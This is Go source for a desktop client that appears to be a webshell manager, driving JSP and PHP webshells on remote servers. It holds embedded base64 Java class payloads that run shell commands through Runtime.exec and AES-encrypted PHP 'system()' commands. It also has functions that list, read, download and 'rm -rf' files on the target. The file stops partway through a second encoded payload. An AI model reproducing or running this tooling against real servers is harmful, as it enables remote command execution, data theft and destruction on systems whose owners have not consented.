package main

import (
	"bytes"
	"encoding/base64"
	"fmt"
	"fyne.io/fyne/v2/dialog"
	"io"
	"io/ioutil"
	"net/http"
	neturl "net/url"
	"os"
	"sort"
	"strconv"
	"strings"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"github.com/flopp/go-findfont"
)

var password1 = ""

func init() {
	// 设置中文字体
	fontPaths := findfont.List()
	for _, path := range fontPaths {
		if strings.Contains(path, "msyh.ttf") || strings.Contains(path, "simhei.ttf") || strings.Contains(path, "simsun.ttc") || strings.Contains(path, "simkai.ttf") {
			os.Setenv("FYNE_FONT", path)
			break
		}
	}
}

var shareURL string

func executeCommand3(connURL, command string) (string, error) {
	var fullURL string
	shareURL = connURL
	fmt.Println(connType)
	fmt.Println(1)
	if connType == "JSP+" {
		Encommand := base64Encode(command)
		if connType == "JSP+" {
			fullURL = fmt.Sprintf("%s?Enco=base64&C1=L2Jpbi9zaA==&C2=%s", connURL, Encommand)
		}
		fmt.Printf("fullURL: %s\n", fullURL)

		fmt.Printf("password1: %s\n", password1)
		data := neturl.Values{}
		data.Set(password1, "yv66vgAAADcBKwoAQAB4CQBbAHkJAFsAegcAewoABAB8BwB9CgAEAH4HAH8KAEAAgAgAXAoAPQCBCgCCAIMKAIIAhAgAXgcAhQoADwCGCACHCwAGAIgIAIkJAFsAiggAiwgAjAkAWwCNBwCOCgAYAI8IAJALAAgAkQsABgCSCwAIAJIIAJMSAAAAlwoAWwCYCgBbAJkIAJoKAFsAmwoAGACcCgAYAJ0LAAgAngoAnwCgCgAPAJ0SAAEAlwgAogoALACjBwCkCgAsAKUKACwApggApwoALACoBwCpCgAsAKoKADEAqwoALACsCgAsAK0SAAIArwoAMQCwCgAxALEIALIIALMKAD0AtAgAtQcAtgoAPQC3CgA9ALgHALkKALoAuwcAvAcAvQgAvggAvwgAbQoAWwDACADBCADCCgDDAMQKAMMAxQoAxgDHCgBbAMgKAMYAyQgAygoAywDMCgAsAM0IAM4KACwAzwcA0AcA0QoAVQDSCgBUANMKAFQA1BIAAwCXCgBUANYHAG4BAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAHZW5jb2RlcgEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAAmNzAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEADVN0YWNrTWFwVGFibGUBAAJFQwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAKRXhjZXB0aW9ucwEABmRlY29kZQEAEkV4ZWN1dGVDb21tYW5kQ29kZQEAOChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7BwDXAQAFaXNXaW4BAAMoKVoBAA9Db3B5SW5wdXRTdHJlYW0BADAoTGphdmEvaW8vSW5wdXRTdHJlYW07TGphdmEvbGFuZy9TdHJpbmdCdWZmZXI7KVYHANgBAApTb3VyY2VGaWxlAQAXRXhlY3V0ZUNvbW1hbmRDb2RlLmphdmEMAGMAZAwAXABdDABeAF8BAB1qYXZheC9zZXJ2bGV0L2pzcC9QYWdlQ29udGV4dAwA2QDaAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAwA2wDcAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UMAN0A3gwA3wDgBwDhDADiAOMMAOQA5QEAE2phdmEvbGFuZy9FeGNlcHRpb24MAOYAZAEABEVuY28MAOcAawEAAAwAYABhAQAHY2hhcnNldAEABVVURi04DABiAGEBABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyDABjAOgBAAl0ZXh0L2h0bWwMAOkA6AwA6gDoAQACQzEBABBCb290c3RyYXBNZXRob2RzDwYA6wgA7AwA7QBrDABtAGsMAGoAawEAAkMyDABuAG8MAO4A7wwA8ADxDADyAPMHAPQMAPUA6AgA9gEAA2hleAwAZwBoAQAQamF2YS9sYW5nL1N0cmluZwwA9wD4DABjAPkBABAwMTIzNDU2Nzg5QUJDREVGDAD6APEBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwA+wD8DABjAP0MAP4A/wwBAAEBCAECDADtAQMMAQQA/QwA8ABrAQAGYmFzZTY0AQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgwBBQEGAQAMZGVjb2RlQnVmZmVyAQAPamF2YS9sYW5nL0NsYXNzDAEHAQgMAQkBCgEAEGphdmEvbGFuZy9PYmplY3QHAQsMAQwBDQEAAltCAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24BABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RGVjb2RlcgwAcQByAQACLWMBAAIvYwcBDgwBDwEQDAERARIHARMMARQBFQwAcwB0DAEWARUBAAdvcy5uYW1lBwEXDAEYAGsMARkA8QEAA3dpbgwBGgEbAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgEAGWphdmEvaW8vSW5wdXRTdHJlYW1SZWFkZXIMAGMBHAwAYwEdDAEeAPEIAR8MASAAZAEAE1tMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAKZ2V0UmVxdWVzdAEAICgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQALZ2V0UmVzcG9uc2UBACEoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAMZ2V0UGFyYW1ldGVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAOc2V0Q29udGVudFR5cGUBABRzZXRDaGFyYWN0ZXJFbmNvZGluZwoBIQEiAQABAQEAF21ha2VDb25jYXRXaXRoQ29uc3RhbnRzAQAGYXBwZW5kAQAsKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFcHJpbnQBAApFUlJPUjovLyABAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAXKFtCTGphdmEvbGFuZy9TdHJpbmc7KVYBAAt0b1VwcGVyQ2FzZQEABmxlbmd0aAEAAygpSQEABChJKVYBAAZjaGFyQXQBAAQoSSlDAQAHaW5kZXhPZgEABChJKUkBAAMBASwBACcoTGphdmEvbGFuZy9TdHJpbmc7SSlMamF2YS9sYW5nL1N0cmluZzsBAAV3cml0ZQEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEADmdldEVycm9yU3RyZWFtAQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAqKExqYXZhL2lvL0lucHV0U3RyZWFtO0xqYXZhL2xhbmcvU3RyaW5nOylWAQATKExqYXZhL2lvL1JlYWRlcjspVgEACHJlYWRMaW5lAQADAQ0KAQAFY2xvc2UHASMMAO0BJwEAJGphdmEvbGFuZy9pbnZva2UvU3RyaW5nQ29uY2F0RmFjdG9yeQcBKQEABkxvb2t1cAEADElubmVyQ2xhc3NlcwEAmChMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7BwEqAQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwAhAFsAQAAAAAQAAQBcAF0AAAABAF4AXwAAAAEAYABhAAAAAQBiAGEAAAAHAAEAYwBkAAEAZQAAAC8AAgABAAAADyq3AAEqAbUAAioBtQADsQAAAAEAZgAAAA4AAwAAAAoABAALAAkADAABAGcAaAABAGUAAALvAAQA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")
		encodedData := data.Encode()

		req, err := http.NewRequest("POST", fullURL, strings.NewReader(encodedData))
		if err != nil {
			return "", err
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			return "", err
		}
		defer resp.Body.Close()

		body, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			return "", err
		}

		fmt.Printf("Response body: %s\n", string(body))

		return string(body), nil
	}
	if connType == "PHP+" {
		fmt.Println(connURL)
		AESkey, sessionID = PHPEConnection1(connURL, password1)
		command := fmt.Sprintf(`hello | system('%s');`, command)
		encrypted, err := encryptAES128ECB([]byte(command), []byte(AESkey))
		if err != nil {
			return "0", nil
		}
		fmt.Printf("AESkey:%s\n", AESkey)
		fmt.Printf("sessionID:%s\n", sessionID)
		postData := encrypted
		fmt.Println(url)
		req, err := http.NewRequest("POST", connURL, bytes.NewBuffer([]byte(postData)))
		if err != nil {
			return "0", nil
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Set("Cookie", sessionID)
		fmt.Println("Post Data: ", postData)
		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			return "0", nil
		}
		defer resp.Body.Close()

		postRespBody, err := ioutil.ReadAll(resp.Body)
		fmt.Println(1)
		if err != nil {
			return "0", nil
		}
		fmt.Printf("postRespBody:%s", postRespBody)
		return string(postRespBody), nil

	}

	return "0", nil
}

func listFiles3(remoteURL, path string) ([]FileItem, error) {
	command := fmt.Sprintf("ls -l %s", path)
	output, err := executeCommand3(remoteURL, command)
	if err != nil {
		return nil, err
	}

	lines := strings.Split(output, "\n")
	var files []FileItem
	for _, line := range lines {
		if line == "" {
			continue
		}
		fields := strings.Fields(line)
		if len(fields) < 9 {
			continue
		}
		isDir := fields[0][0] == 'd'
		name := fields[8]
		perms := fields[0]
		size := fields[4] + " B"
		if !isDir {
			sizeValue, _ := strconv.ParseInt(fields[4], 10, 64)
			if sizeValue >= 1024 {
				size = fmt.Sprintf("%.2f KB", float64(sizeValue)/1024)
			}
		}
		date := fmt.Sprintf("%s %s %s", fields[5], fields[6], fields[7])
		files = append(files, FileItem{Name: name, IsDir: isDir, Perms: perms, Size: size, Date: date})
	}

	sort.Slice(files, func(i, j int) bool {
		if files[i].IsDir == files[j].IsDir {
			return files[i].Name < files[j].Name
		}
		return files[i].IsDir && !files[j].IsDir
	})

	return files, nil
}

func deleteFile3(remoteURL, path string) error {
	command := fmt.Sprintf("rm -rf %s", path)
	_, err := executeCommand3(remoteURL, command)
	return err
}

func showFileContent3(remoteURL, filePath string) (string, error) {
	command := fmt.Sprintf("cat %s", filePath)
	fmt.Printf("filepath is:%s", filePath)
	return executeCommand3(remoteURL, command)
}

func RunFileManager3(myWindow fyne.Window, remoteURL string, connType string, password string) {
	password1 = password

	resp, err := http.Get(remoteURL)
	if err != nil {
		fmt.Println("Failed to make GET request:", err)
		return
	}
	defer resp.Body.Close()

	var currentPath = "/"
	var list *widget.List
	var files []FileItem

	fmt.Println("Connection Type:", connType)

	updateList := func() {
		var err error
		files, err = listFiles3(remoteURL, currentPath)
		if err != nil {
			files = []FileItem{{Name: "Error: " + err.Error(), IsDir: false}}
		}
		list.Refresh()
	}

	list = widget.NewList(
		func() int {
			return len(files)
		},
		func() fyne.CanvasObject {
			return container.NewGridWithColumns(8,
				widget.NewIcon(theme.FileIcon()),
				widget.NewLabel("File"),
				widget.NewLabel("Date"),
				widget.NewLabel("Size"),
				widget.NewLabel("Perms"),
				container.NewHBox(
					widget.NewButtonWithIcon("", theme.FolderOpenIcon(), nil),
					widget.NewButtonWithIcon("", theme.DownloadIcon(), nil),
					widget.NewButtonWithIcon("", theme.DeleteIcon(), nil),
				),
			)
		},
		func(id widget.ListItemID, item fyne.CanvasObject) {
			file := files[id]
			grid := item.(*fyne.Container)
			icon := grid.Objects[0].(*widget.Icon)
			nameLabel := grid.Objects[1].(*widget.Label)
			dateLabel := grid.Objects[2].(*widget.Label)
			sizeLabel := grid.Objects[3].(*widget.Label)
			permsLabel := grid.Objects[4].(*widget.Label)
			buttonContainer := grid.Objects[5].(*fyne.Container)
			openBtn := buttonContainer.Objects[0].(*widget.Button)
			downloadBtn := buttonContainer.Objects[1].(*widget.Button)
			deleteBtn := buttonContainer.Objects[2].(*widget.Button)

			nameLabel.SetText(file.Name)
			dateLabel.SetText(file.Date)
			sizeLabel.SetText(file.Size)
			permsLabel.SetText(file.Perms)

			if file.IsDir {
				icon.SetResource(theme.FolderIcon())
				openBtn.SetIcon(theme.FolderOpenIcon())
				sizeLabel.SetText("")
				dateLabel.SetText("")
				deleteBtn.Hide()
				downloadBtn.Hide()
			} else {
				icon.SetResource(theme.FileIcon())
				openBtn.SetIcon(theme.DocumentIcon())
				deleteBtn.Show()
				downloadBtn.Show()
			}

			downloadBtn.OnTapped = func() {
				if !file.IsDir {
					if connType == "PHP+" {
						fmt.Printf("获取key:%s\n", remoteURL)
						AESkey2, sessionID2 := PHPEConnection1(remoteURL, password1)
						fmt.Printf("获取到了key:%s\n", AESkey2)

						command := fmt.Sprintf(`hello|header('Content-Disposition: attachment; filename=\"%s\"'); readfile('%s');`, file.Name, currentPath+file.Name)

						encrypted, err := encryptAES128ECB([]byte(command), []byte(AESkey2))
						postData := encrypted
						fmt.Println(err)
						dialog.ShowFileSave(func(writer fyne.URIWriteCloser, _ error) {
							if writer == nil {
								return // 用户取消了操作
							}
							req, err := http.NewRequest("POST", remoteURL, bytes.NewBuffer([]byte(postData)))
							if err != nil {
								dialog.ShowError(fmt.Errorf("创建POST请求时出错: %v", err), w)
								return
							}
							req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
							req.Header.Set("Cookie", sessionID2)

							client := &http.Client{}
							resp, err := client.Do(req)
							if err != nil {
								dialog.ShowError(fmt.Errorf("POST请求失败: %v", err), w)
								return
							}

							defer resp.Body.Close()

							dstFile, err := os.Create(writer.URI().Path())
							if err != nil {
								dialog.ShowError(err, w)
								return
							}
							defer dstFile.Close()

							_, err = io.Copy(dstFile, resp.Body)
							if err != nil {
								dialog.ShowError(err, w)
								return
							}

							dialog.ShowInformation("下载完成", fmt.Sprintf("文件已保存到: %s", writer.URI().Path()), w)

						}, w)
					} else if connType == "JSP+" {
						rawURL := shareURL
						filename := base64Encode(currentPath + file.Name)

						encodedParams := neturl.QueryEscape(filename)
						downloadURL := fmt.Sprintf("%s?encoder=base64&var1=%s", rawURL, encodedParams)
						fmt.Println(downloadURL)
						dialog.ShowFileSave(func(writer fyne.URIWriteCloser, _ error) {
							if writer == nil {
								return // 用户取消了操作
							}

							data := neturl.Values{}
							data.Set(password1, "yv66vgAAADcBFQoAQQBwCQBYAHEJAFgAcgcAcwoABAB0BwB1CgAEAHYHAHcKAEEAeAgAWQoAPgB5CgB6AHsKAHoAfAgAWwcAfQoADwB+CABdCwAGAH8IAIAJAFgAgQgAgggAgwkAWACEBwCFCgAYAIYIAIcLAAgAiAsABgCJCwAIAIkIAIoSAAAAjgoAWACPCgBYAJAIAJEKABgAkgoAWACTCgAYAJQIAJULAAgAlgoAlwCYCgAPAJQSAAEAjggAmgoALQCbBwCcCgAtAJ0KAC0AnggAnwoALQCgBwChCgAtAKIKADIAowoALQCkCgAtAKUSAAIApwoAMgCoCgAyAKkIAKoIAKsKAD4ArAgArQcArgoAPgCvCgA+ALAHALEKALIAswcAtAcAtQgAtggAtwgAagsACAC4CAC5CAC6CgAtALsKAC0AvBIAAwCOCwAIAL4LAAgAvwcAwAcAwQoAUQCGCgBQAMIKAFAAwwoAbQDECgBtAMUKAFAAxQcAawEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAdlbmNvZGVyAQASTGphdmEvbGFuZy9TdHJpbmc7AQACY3MBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQANU3RhY2tNYXBUYWJsZQEAAkVDAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApFeGNlcHRpb25zAQAGZGVjb2RlAQAQRG93bmxvYWRGaWxlQ29kZQEAPShMamF2YS9sYW5nL1N0cmluZztMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYHAMYBAApTb3VyY2VGaWxlAQAVRG93bmxvYWRGaWxlQ29kZS5qYXZhDABgAGEMAFkAWgwAWwBcAQAdamF2YXgvc2VydmxldC9qc3AvUGFnZUNvbnRleHQMAMcAyAEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAMkAygEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDADLAMwMAM0AzgcAzwwA0ADRDADSANMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDADUAGEMANUAaAEAAAwAXQBeAQAHY2hhcnNldAEABVVURi04DABfAF4BABZqYXZhL2xhbmcvU3RyaW5nQnVmZmVyDABgANYBABhhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0MANcA1gwA2ADWAQAEdmFyMQEAEEJvb3RzdHJhcE1ldGhvZHMPBgDZCADaDADbAGgMAGoAaAwAZwBoAQADLT58DADcAN0MAGsAbAwA3gDfAQADfDwtDADgAOEHAOIMAOMA1ggA5AEAA2hleAwAZABlAQAQamF2YS9sYW5nL1N0cmluZwwA5QDmDABgAOcBABAwMTIzNDU2Nzg5QUJDREVGDADoAN8BAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwA6QDqDABgAOsMAOwA7QwA7gDvCADwDADbAPEMAPIA6wwA3gBoAQAGYmFzZTY0AQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgwA8wD0AQAMZGVjb2RlQnVmZmVyAQAPamF2YS9sYW5nL0NsYXNzDAD1APYMAPcA+AEAEGphdmEvbGFuZy9PYmplY3QHAPkMAPoA+wEAAltCAQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24BABBqYXZhLnV0aWwuQmFzZTY0AQAKZ2V0RGVjb2RlcgwA/ABhAQATQ29udGVudC1EaXNwb3NpdGlvbgEAAS8MAP0A/gwA/wEACAEBDAECAQMMAQQBBQEAG2phdmEvaW8vQnVmZmVyZWRJbnB1dFN0cmVhbQEAF2phdmEvaW8vRmlsZUlucHV0U3RyZWFtDABgAQYMAQcBCAwA8gEJDAEKAGEBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW0BAApnZXRSZXF1ZXN0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAAtnZXRSZXNwb25zZQEAISgpTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBAAxnZXRQYXJhbWV0ZXIBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA5zZXRDb250ZW50VHlwZQEAFHNldENoYXJhY3RlckVuY29kaW5nCgELAQwBAAEBAQAXbWFrZUNvbmNhdFdpdGhDb25zdGFudHMBAAZhcHBlbmQBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAVwcmludAEACkVSUk9SOi8vIAEBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAC3RvVXBwZXJDYXNlAQAGbGVuZ3RoAQADKClJAQAEKEkpVgEABmNoYXJBdAEABChJKUMBAAdpbmRleE9mAQAEKEkpSQEAAwEBLAEAJyhMamF2YS9sYW5nL1N0cmluZztJKUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQAHZm9yTmFtZQEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABXJlc2V0AQALbGFzdEluZGV4T2YBABUoTGphdmEvbGFuZy9TdHJpbmc7KUkBAAlzdWJzdHJpbmcBABUoSSlMamF2YS9sYW5nL1N0cmluZzsBABhhdHRhY2htZW50OyBmaWxlbmFtZT0iASIBAAlzZXRIZWFkZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7KVYBAA9nZXRPdXRwdXRTdHJlYW0BACUoKUxqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAEcmVhZAEAByhbQklJKUkBAAcoW0JJSSlWAQAFY2xvc2UHAQ0MANsBEQEAJGphdmEvbGFuZy9pbnZva2UvU3RyaW5nQ29uY2F0RmFjdG9yeQcBEwEABkxvb2t1cAEADElubmVyQ2xhc3NlcwEAmChMamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cDtMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL2ludm9rZS9NZXRob2RUeXBlO0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9pbnZva2UvQ2FsbFNpdGU7BwEUAQAlamF2YS9sYW5nL2ludm9rZS9NZXRob2RIYW5kbGVzJExvb2t1cAEAHmphdmEvbGFuZy9pbnZva2UvTWV0aG9kSGFuZGxlcwAhAFgAQQAAAAQAAQBZAFoAAAABAFsAXAAAAAEAXQBeAAAAAQBfAF4AAAAFAAEAYABhAAEAYgAAAC8AAgABAAAADyq3AAEqAbUAAioBtQADsQAAAAEAYwAAAA4AAwAAAAoABAALAAkADAABAGQAZ